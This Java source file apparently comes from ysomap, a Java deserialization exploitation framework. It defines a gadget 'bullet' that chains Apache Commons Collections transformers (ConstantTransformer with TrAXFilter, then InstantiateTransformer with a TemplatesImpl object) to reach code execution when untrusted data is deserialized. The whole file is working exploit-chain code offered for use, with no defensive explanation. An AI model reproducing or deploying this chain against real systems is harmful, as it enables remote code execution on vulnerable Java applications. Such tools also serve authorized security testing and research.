package ysomap.gadget.bullet.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.TemplatesImplBullet;
import ysomap.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationTargetException;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Dependencies({"*"})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithTemplatesImplBullet extends TransformerBullet {

    ObjectGadget tplBullet;
    Class instantiateTransformer;

    public TransformerWithTemplatesImplBullet(String[] args, int version) {
        super(args, version);
        this.tplBullet = new TemplatesImplBullet(args);
    }

    @Override
    public void initClazz() throws ClassNotFoundException {
        super.initClazz();
        if(version == 3){
            instantiateTransformer = Class.forName("org.apache.commons.collections.functors.InstantiateTransformer");
        }else{
            instantiateTransformer = Class.forName("org.apache.commons.collections4.functors.InstantiateTransformer");
        }
    }

    @Override
    public Object getObject() throws Exception {
        Object obj = tplBullet.getObject();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(TrAXFilter.class));
        transformers.add(createInstantiateTransformer(new Class[] { Templates.class },
                                                        new Object[] { obj } ));
        return createTransformerArray(transformers);
    }

    public Object createInstantiateTransformer(Object... args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        return Reflections.newInstance(instantiateTransformer.getName(),
                new Class<?>[]{Class[].class,Object[].class},
                args
                );
    }

}
